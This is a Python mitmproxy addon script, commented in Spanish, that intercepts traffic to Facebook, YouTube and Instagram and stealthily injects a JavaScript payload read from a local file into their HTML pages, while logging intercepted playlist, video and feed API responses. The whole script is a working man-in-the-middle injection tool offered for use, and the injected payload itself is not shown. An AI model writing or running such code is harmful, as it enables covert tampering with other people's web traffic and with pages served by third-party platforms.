#!/usr/bin/env python3
"""
MITM Proxy Script - Inyecta JS CMS en Facebook/YouTube WebViews
Uso: mitmdump -s proxy_injector.py --listen-port 8080
"""
from mitmproxy import http
import re

class ShadowPlaylistInjector:
    def __init__(self):
        with open("payloads/playlist_manager.js", "r") as f:
            self.payload = f.read()
    
    def response(self, flow: http.HTTPFlow) -> None:
        host = flow.request.pretty_host.lower()
        content_type = flow.response.headers.get("Content-Type", "")
        
        # Targets específicos
        if any(t in host for t in ["facebook.com", "youtube.com", "instagram.com", "fbcdn.net"]):
            if "text/html" in content_type or "application/xhtml+xml" in content_type:
                # Inyección stealth antes </body>
                injection = f'<script id="__shadow_cms__" type="text/javascript">{self.payload}</script>'
                if b"</body>" in flow.response.content:
                    flow.response.content = flow.response.content.replace(
                        b"</body>", injection.encode('utf-8') + b"</body>"
                    )
                    print(f"[+] 🎬 CMS inyectado: {flow.request.pretty_url}")
            
            # Modificar API responses de playlists
            elif "application/json" in content_type and any(k in flow.request.path for k in ["playlist", "video", "feed"]):
                print(f"[+] 📡 API playlist interceptada: {flow.request.pretty_url}")

addons = [ShadowPlaylistInjector()]